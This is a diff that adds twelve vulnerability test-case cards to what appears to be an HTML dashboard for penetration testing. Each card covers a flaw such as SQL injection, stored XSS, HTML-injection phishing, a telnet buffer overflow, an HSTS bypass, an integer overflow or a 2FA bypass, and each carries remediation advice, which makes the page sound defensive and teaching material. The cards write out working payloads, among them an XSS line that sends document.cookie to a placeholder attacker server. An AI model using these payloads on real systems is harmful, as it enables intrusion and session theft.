@@ -592,11 +592,11 @@
     <section class="top-row">
       <div class="metric">
         <h2>Total Test Cases</h2>
-        <div class="metric-value">187</div>
+        <div class="metric-value">199</div>
       </div>
       <div class="metric">
         <h2>Last Updated</h2>
-        <div class="metric-value">2026-02-23</div>
+        <div class="metric-value">2026-03-01</div>
       </div>
     </section>
 
@@ -604,7 +604,7 @@
       <h2>Category Breakdown</h2>
       
     <div class="analytics-row">
-      <div class="analytics-label">Web App <span>88</span></div>
+      <div class="analytics-label">Web App <span>95</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:100%"></div>
       </div>
@@ -612,23 +612,23 @@
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Network <span>62</span></div>
+      <div class="analytics-label">Network <span>64</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:70%"></div>
+        <div class="analytics-bar-fill" style="width:67%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">API <span>17</span></div>
+      <div class="analytics-label">API <span>19</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:19%"></div>
+        <div class="analytics-bar-fill" style="width:20%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Source Code <span>14</span></div>
+      <div class="analytics-label">Source Code <span>15</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:16%"></div>
       </div>
@@ -676,11 +676,11 @@
       <div>
         <label for="categoryFilter">Category</label>
         <select id="categoryFilter">
-          <option value="all">All Categories (187)</option>
-          <option value="Web App">Web App (88)</option>
-<option value="Network">Network (62)</option>
-<option value="API">API (17)</option>
-<option value="Source Code">Source Code (14)</option>
+          <option value="all">All Categories (199)</option>
+          <option value="Web App">Web App (95)</option>
+<option value="Network">Network (64)</option>
+<option value="API">API (19)</option>
+<option value="Source Code">Source Code (15)</option>
 <option value="Other">Other (3)</option>
 <option value="Blockchain">Blockchain (1)</option>
 <option value="Desktop App">Desktop App (1)</option>
@@ -693,6 +693,382 @@
 
     <section class="cards" id="cardContainer">
       
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">SQL Injection via &lt;PARAMETER&gt;</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves the possibility of SQL injection through a user-supplied parameter. Attackers can manipulate the parameter value to inject malicious SQL code, potentially leading to unauthorized data access or modification. This can severely compromise the integrity and confidentiality of the underlying database.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a GET or POST request to &lt;TARGET_URL&gt;, including the &lt;PARAMETER&gt; parameter.</li>
+<li>Set the value of the &lt;PARAMETER&gt; parameter to a malicious SQL injection payload.</li>
+<li>Example Payload: <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li>Observe the application’s response. If the SQL injection is successful, the response will reflect the injected SQL code, indicating a vulnerability.</li>
+<li>Further payloads can be used to extract data, modify records, or execute arbitrary SQL commands.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this SQL injection vulnerability can result in unauthorized access to sensitive data, modification of database records, or even complete control over the database server. This can lead to data breaches, financial loss, and reputational damage.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Implement parameterized queries or prepared statements to prevent SQL injection.  Validate and sanitize user inputs before incorporating them into SQL queries. Employ web application firewalls (WAFs) to detect and block malicious SQL injection attempts.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">SQL Injection via &lt;PARAMETER&gt;</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a SQL injection flaw that allows an attacker to manipulate database queries through an injectable parameter. Improper sanitization of user input leads to the execution of arbitrary SQL code, potentially exposing sensitive data or compromising the integrity of the database.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a GET request to <code>&lt;TARGET<em>URL&gt;/&lt;ENDPOINT&gt;</code> with the <code>theme</em>name</code> parameter.</li>
+<li>Inject the following SQL payload in the <code>theme_name</code> parameter: <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code>.</li>
+<li>Observe the response for any unexpected results or error messages indicating successful SQL injection.</li>
+<li>Modify the payload to extract data, such as <code>&#x27; UNION SELECT version() -- -</code>.</li>
+<li>Analyze the server’s response to confirm the injected SQL query is being executed and the version of the database server is returned.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this SQL injection vulnerability can lead to unauthorized data access, data modification, or even complete database compromise, potentially leading to data theft, denial of service, or account takeover.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement parameterized queries or prepared statements to prevent SQL injection attacks.  Always validate and sanitize user-supplied input before incorporating it into SQL queries. Consider using an ORM (Object-Relational Mapper) to abstract database interactions and reduce the risk of SQL injection.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Publicly Accessible Directory Exposing Configuration Files</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A publicly accessible directory, intended for web server files, was found to be exposed, revealing sensitive configuration files. This exposure allows an attacker to potentially retrieve sensitive information, understand the application’s structure, and plan further attacks. The exposed files can be used for reconnaissance and may lead to more serious vulnerabilities.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Attempt to access a directory named &quot;public<em>html&quot; (or a similar naming convention commonly used for web server root directories) on the target web server via a web browser, for example, &lt;TARGET</em>URL&gt;/public_html/.</li>
+<li>Observe the response. If the directory listing is enabled, a list of files and directories within the &quot;public_html&quot; directory will be displayed.</li>
+<li>Examine the listed files and directories. Look for files with extensions commonly associated with configuration files, such as .conf, .ini, .xml, .php, or .txt.</li>
+<li>If configuration files are listed, attempt to download them or view their contents.</li>
+<li>Analyze the contents of the configuration files for sensitive information such as database credentials, API keys, or other secrets.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exposure of configuration files can lead to data theft, privilege escalation, or further compromise of the web server. Sensitive credentials can be used to access internal systems or services.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Disable directory listing on web servers. Ensure that configuration files are not publicly accessible and are stored in secure locations with restricted access. Implement robust access control mechanisms to prevent unauthorized access to sensitive files.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Sensitive Information Exposure via Export Endpoint</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerable endpoint allows for the exposure of sensitive information when generating an export file. The endpoint lacks proper authorization checks, enabling unauthorized users to access and download data they should not have access to, potentially leading to data breaches and privacy violations. This flaw highlights a risk of data leakage and potential misuse of sensitive information.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a GET request to the export endpoint: <code>/export<em>panelists</em>to_xlsx</code>.</li>
+<li>Observe the response. If the server does not require authentication or authorization, the export file containing sensitive information is downloaded.</li>
+<li>Examine the downloaded file to confirm that it contains sensitive data that the user is not authorized to access.</li>
+<li>Verify that no user authentication or authorization is needed to trigger the file generation.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive data, potentially leading to data breaches, privacy violations, and misuse of information.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust authentication and authorization mechanisms to ensure only authorized users can access the export endpoint. Validate user roles and permissions before allowing data export and limit the data available for export based on user privileges.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Information Disclosure via Publicly Accessible Endpoint</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A publicly accessible API endpoint was discovered that inadvertently exposes internal user identifiers and associated email addresses. This vulnerability allows an attacker to enumerate user accounts and potentially link these identifiers to other systems or data, leading to privacy breaches and potential account compromise.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a GET request to the publicly accessible endpoint located at &lt;ENDPOINT_URL&gt;.</li>
+<li>Observe the response body. The response contains a list of user objects.</li>
+<li>Each user object contains a unique identifier (&lt;USER<em>ID&gt;) and an email address (&lt;EMAIL</em>ADDRESS&gt;).</li>
+<li>Iterate through the list of user objects and extract the &lt;USER<em>ID&gt; and &lt;EMAIL</em>ADDRESS&gt; for each user.</li>
+<li>Verify that the exposed information is not intended to be publicly accessible.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized disclosure of user identifiers and email addresses can facilitate targeted attacks, account takeover attempts, or other malicious activities. This can lead to privacy violations and potentially compromise the confidentiality and integrity of sensitive data.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust access control mechanisms to restrict access to sensitive API endpoints. Ensure that only authorized users or applications can access this data.  Consider rate limiting and input validation to prevent bulk enumeration of user identifiers. Sanitize and validate any data returned in the API response to prevent unintended information disclosure.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">HTML Injection in Email Confirmation</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject arbitrary HTML into email confirmation messages. This can be exploited to craft phishing emails that appear to originate from a legitimate source, potentially leading recipients to click malicious links or provide sensitive information. The core issue is a lack of proper sanitization of user-supplied data before inclusion in email content.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to a form that sends a confirmation email.</li>
+<li>Locate the &quot;First Name&quot; field (or a similar field used in the confirmation email).</li>
+<li>Input a malicious HTML payload into the field.</li>
+<li>Submit the form using a valid recipient email address.</li>
+<li>Check the recipient’s inbox for the confirmation email.</li>
+<li>Observe that the injected HTML is rendered in the email body.</li>
+<li>Example Payload: <code>&lt;h1 style=&quot;color:red;&quot;&gt;&lt;a href=&quot;https://&lt;ATTACKER_URL&gt;&quot;&gt;Click here for exclusive offers&lt;/a&gt;&lt;/h1&gt;&gt;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can craft highly convincing phishing emails, potentially leading to account compromise, credential theft, or malware infection. The ability to inject HTML allows for manipulation of the email content to mimic the trusted sender&#x27;s branding and messaging.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding on all user-supplied data used in email generation. Utilize a template engine with automatic escaping capabilities to prevent HTML injection. Sanitize user input to remove or encode potentially harmful HTML tags and attributes before inclusion in email content.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Telnet Suboption Buffer Overflow</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a buffer overflow within the telnet protocol handling code. A malformed telnet suboption, exceeding the expected buffer size, can cause the program to overwrite adjacent memory regions, leading to a denial of service and potentially other exploitable consequences. It allows for remote exploitation without requiring authentication.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Start a listening service that sends a crafted telnet suboption. The service should listen on a specific port.</li>
+<li>Connect to the listening service using a tool like curl with the <code>telnet://</code> protocol.</li>
+<li>The crafted suboption payload consists of an IAC SB sequence followed by more than 512 bytes of data. This will cause a buffer overflow in the receiving application.</li>
+<li>Example payload: <code>\xff\xfd\x18</code> + <code>&#x27;A&#x27; * 513 + &#x27;\xff\xf0&#x27;</code> (This payload sends an IAC SB followed by 513 bytes of &#x27;A&#x27; characters and then a Telnet End of Subnegotiation sequence.)</li>
+<li>Use the command: <code>./src/curl telnet://&lt;TARGET<em>IP&gt;:&lt;PORT&gt;</code> where &lt;TARGET</em>IP&gt; is the IP of the listening service and &lt;PORT&gt; is the listening port.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The vulnerability can lead to a denial-of-service condition, corrupt the program&#x27;s memory state, and potentially allow an attacker to gain further control of the affected system.  The ability to trigger this remotely without authentication increases the risk significantly.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict bounds checking when handling incoming data, particularly within protocol handlers like telnet. Ensure that buffers are large enough to accommodate the maximum expected size of suboptions and that any excess data is rejected or handled gracefully.  Consider disabling or removing potentially vulnerable protocol support if it is not essential.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">HSTS Bypass via Trailing Dot in URL</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows bypassing HTTP Strict Transport Security (HSTS) by including a trailing dot in the URL when fetching a cached HSTS entry. HSTS forces browsers to communicate with a domain using HTTPS, but a malformed URL can circumvent this restriction, potentially leading to insecure communication over HTTP.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a file named &quot;hsts.txt&quot; (or similar) that contains a valid HSTS header for a target domain. This file would typically be generated by a previous, secure connection to the target domain.</li>
+<li>Execute the following <code>curl</code> command, replacing <code>&lt;HSTS_FILE&gt;</code> with the path to the HSTS file:</li>
+</ol>
+<pre><code>curl --hsts &lt;HSTS_FILE&gt; http://&lt;TARGET_DOMAIN&gt;.</code></pre>
+<ol>
+<li>Observe the response. A successful bypass will result in a redirection to the HTTPS version of the target domain or potentially a connection over HTTP.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Bypassing HSTS allows for potential downgrade attacks where communication can occur over an insecure HTTP connection, exposing sensitive data and enabling man-in-the-middle attacks.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that HSTS caching mechanisms are handled securely and URLs are properly validated to prevent manipulation and bypass. Implement strict input validation and sanitization to prevent users from crafting malicious URLs that circumvent security policies. Regularly review and update HSTS configurations to address potential vulnerabilities.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored XSS via Chat Message</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject malicious scripts into a chat application, potentially leading to the theft of sensitive user data or unauthorized access to backend services. The core issue is a lack of proper input sanitization and output encoding when displaying user-provided chat messages.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the chat application interface.</li>
+<li>Locate the chat input field where messages are sent to other users.</li>
+<li>Craft a malicious XSS payload, such as <code>&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</code> and enter it into the chat input field.</li>
+<li>Submit the chat message.</li>
+<li>Observe if the malicious script executes within the context of another user&#x27;s view of the chat message, triggering the alert or performing other actions.</li>
+<li>Consider using a more complex payload to exfiltrate data or interact with other parts of the application. For instance, <code>&lt;script&gt;fetch(&#x27;&lt;ATTACKER_SERVER&gt;/log?data=&#x27;+document.cookie)&lt;/script&gt;</code> could be used to steal cookies.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker could potentially steal user session cookies, deface the chat interface, redirect users to malicious websites, or gain unauthorized access to backend APIs or services connected to the chat application. The severity is high if it allows for privilege escalation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input sanitization and output encoding on all user-supplied data before displaying it in the application. Utilize a Content Security Policy (CSP) to restrict the execution of inline scripts and other potentially malicious content. Regularly review and update security measures to address emerging XSS techniques.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">Integer Overflow in Multi-Handle Retrieval Leading to Heap Buffer Overflow</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists in a multi-handle retrieval function where an integer overflow can occur when the number of handles approaches the maximum unsigned 32-bit integer value. This overflow results in a <code>malloc(0)</code> call, which returns a non-NULL pointer, leading to a heap buffer overflow during subsequent data writes. Although exploiting this vulnerability requires substantial resources, it represents a critical memory safety issue.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Examine the vulnerable code within a multi-handle retrieval function (e.g., in <code>lib/multi.c</code>). The code likely calculates the number of handles and then allocates memory using <code>malloc</code>.</li>
+<li>Observe that when the handle count reaches <code>UINT_MAX</code> (4,294,967,295), the expression to calculate the required memory size overflows, resulting in a value of 0 being passed to <code>malloc</code>.</li>
+<li>Simulate the overflow by creating a large number of handles, approaching <code>UINT_MAX</code>, using a tool or script. For example, using a modified version of the provided Python PoC:</li>
+</ol>
+
+<pre><code># Simulate integer overflow
+count = 0xFFFFFFFF  # UINT_MAX
+overflow_result = (count + 1) &amp; 0xFFFFFFFF  # Result: 0
+
+# Memory allocation would be:
+element_size = 8  # sizeof(void*) on 64-bit
+alloc_size = element_size * overflow_result  # = 0 bytes
+# malloc(0) returns non-NULL pointer</code></pre>
+<ol>
+<li>Trigger the data write operation that causes the heap buffer overflow, for example by attempting to access data beyond the allocated memory region.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The vulnerability can lead to heap buffer overflows, potentially resulting in denial of service (program crash) and, in certain scenarios, the possibility of arbitrary code execution. This constitutes a memory safety violation with broad security implications.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust checks to prevent integer overflows when calculating memory allocation sizes.  Specifically, before allocating memory, verify that the calculated size does not exceed the maximum value representable by the data type. Add a check like <code>if(count == UINT_MAX) { return NULL; }</code> before performing the <code>malloc</code> operation.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Password Reuse Vulnerability in Password Reset Flow</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The vulnerability allows users to reuse previously used passwords during the password reset process. This behavior deviates from security best practices and weakens account security by enabling users to easily maintain older, potentially compromised passwords. Failure to prevent password reuse can increase the risk of unauthorized access and account takeover.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the application&#x27;s sign-in page.</li>
+<li>Initiate the password reset flow by clicking on a &quot;Forgot password&quot; or similar link.</li>
+<li>Complete the password reset process, typically involving email verification.</li>
+<li>During the password setting stage, attempt to reuse a previously used password as the new password.</li>
+<li>Observe whether the application prevents the reuse of the old password or allows it without any warning or restriction.</li>
+</ol>
+<p>Example payload: <code>&lt;Old Password&gt;</code></p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Account takeover or unauthorized access due to the reuse of compromised or easily guessable passwords. This allows attackers to potentially gain control of user accounts if the previously used password was leaked or discovered.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement password history checks during the password reset process to prevent users from reusing recently used passwords.  Enforce a minimum password age or rotation policy and provide clear warnings to users if they attempt to reuse old passwords. Follow OWASP Authentication Cheat Sheet and NIST 800-63B Digital Identity Guidelines.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">2FA Bypass via Client-Side Modification</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-03-01</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The application enforces two-factor authentication (2FA) for team member invitations. However, a vulnerability exists where client-side validation checks for 2FA requirements can be bypassed through simple manipulation of HTTP responses. This allows invitations to be sent without proper 2FA enforcement, diminishing the security posture.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Sign in to the application as a user.</li>
+<li>Navigate to the team management section.</li>
+<li>Attempt to invite a new team member; observe that the application blocks the invitation and requires 2FA.</li>
+<li>Utilize a proxy tool (like Burp Suite) to intercept the HTTP response from the server when attempting to invite a team member.</li>
+<li>Employ a &quot;Match and Replace&quot; rule within the proxy tool to modify a client-side flag, changing its value from <code>false</code> to <code>true</code>.</li>
+<li>Resend the modified request to the server.</li>
+<li>Refresh the page and retry sending the invitation; the invitation should be successfully sent without prompting for 2FA.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong>  An attacker can bypass 2FA enforcement, allowing them to invite unauthorized users to the team without proper authentication. This can lead to unauthorized access to sensitive data or functionalities.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Implement server-side validation of 2FA requirements before processing any team invitation requests. Do not solely rely on client-side checks, as these can be circumvented.</p>
+      </div>
+    </article>
+    
+
     <article class="card" data-category="Network">
       <button type="button" class="card-toggle">
         <span class="card-title">
